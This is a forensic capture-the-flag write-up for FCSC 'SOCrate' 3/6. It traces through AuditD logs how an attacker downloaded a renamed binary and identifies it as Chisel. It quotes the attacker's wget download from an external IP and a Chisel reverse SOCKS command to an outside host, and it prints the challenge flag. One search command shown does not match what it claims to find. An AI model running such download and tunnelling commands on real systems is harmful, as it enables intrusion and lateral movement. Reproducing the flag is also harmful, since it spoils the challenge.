# SOCrate 3/6

**Scenario:**

> In June 2023, a vital operator was the victim of an attack that compromises its entire information system. You have received the Linux and Windows logs and you have to answer questions from the investigators.
>
> The attacker used the reverse shell of the previous question to download a tool. He then executed this tool.
>
> **Goal:** Find the **download URL** and the **original name** of the tool (the binary was renamed).
>
> **Flag format:** `FCSC{URL|NOM_ORIGINAL}`

---

## Executive Summary

After establishing a reverse shell (Part 2), the attacker **downloaded a secondary post-exploitation tool** onto the Linux webserver and executed it. Log analysis shows the file was downloaded from the attacker’s infrastructure and saved under a misleading name (`text`). By analyzing the **execution behavior and arguments**, we can confidently identify the tool as **Chisel**, a tunneling utility commonly used to create a **reverse SOCKS proxy** for lateral movement.

**Final flag:**

```
FCSC{http://80.125.9.58:80/text|chisel}
```

---

## Investigation Philosophy

Attackers often rename tools to blend in (e.g., calling a binary `text`). Filenames are unreliable indicators. **Command-line arguments and execution patterns**, however, are much harder to fake and usually fingerprint the tool precisely. Our approach:

1. **Find how the tool arrived** (ingress) — look for `wget`/`curl` in logs.
2. **Find how it was executed** — search for the suspicious filename and analyze its arguments.
3. **Attribute the behavior** — map the argument pattern to a known tool.

---

## Step 1 — Decode Audit Logs

Linux **AuditD** logs often store arguments in hex within the `PROCTITLE` field. To make them readable, we directly use `ausearch -i` on each log file and filter on specific commands.

Instead of building a global file first, we query the logs live using a loop over all `.log` files.

This produces `full.txt`, a human-readable timeline of executed commands.

---

## Step 2 — Identify Ingress 

Once an attacker has a shell, the next step is usually to **download tooling** using `wget` or `curl`. We therefore search for `wget` executions in the AuditD logs and filter for URLs.

We use the following command (as provided):

```bash
for f in *.log; do 
  ausearch -i -if "$f" -c wget 2>/dev/null; 
done | grep -r "http://"
````

**What this does:**

* Iterates over all `.log` files
* Decodes AuditD entries with `-i`
* Filters on the `wget` command (`-c wget`)
* Keeps only lines containing `http://`

**Result:**

We observe downloads from the attacker’s infrastructure, including:

```
wget http://80.125.9.58:80/text
```

**Analysis:**

* The attacker downloads a file from `80.125.9.58`.
* The file is saved under the misleading name **`text`**, likely to avoid suspicion.

---

## Step 3 — Identify Execution (What Is the Tool?)

Next, we look for executions of the suspicious file `text` in the logs. Using the second provided command:

```bash
for f in *.log; do 
  ausearch -i -if "$f" -c wget 2>/dev/null; 
done | grep -r "\./text" .
```

This reveals executions of the downloaded binary, including:

```
./text client -v 80.125.9.57:50012 R:socks
```

---

## Step 4 — Behavioral Attribution 

Let’s break down the arguments:

* `client` → Indicates a **client/server** architecture.
* `-v` → Verbose mode (generic, but common).
* `R:socks` → **Critical indicator**. This exact syntax is characteristic of **Chisel** and denotes a **Reverse SOCKS proxy**.

This argument pattern is **distinctive** and maps directly to **Chisel**, a fast TCP/UDP tunneling tool over HTTP(S), frequently used by attackers to pivot inside networks.

**Why Chisel here?**

* A simple reverse shell gives command execution on one host.
* A **reverse SOCKS proxy** turns that host into a **pivot point**.
* The attacker can now route traffic through the webserver to reach **internal systems** (e.g., Windows machines), enabling **lateral movement**.

**Conclusion (Attribution):**

* **Original tool name:** `chisel`

---

## Step 5 — Flag Construction

The challenge requires:

* **URL** of the download
* **Original tool name**

We found:

* URL: `http://80.125.9.58:80/text`
* Tool: `chisel`

**Flag:**

```
FCSC{http://80.125.9.58:80/text|chisel}
```
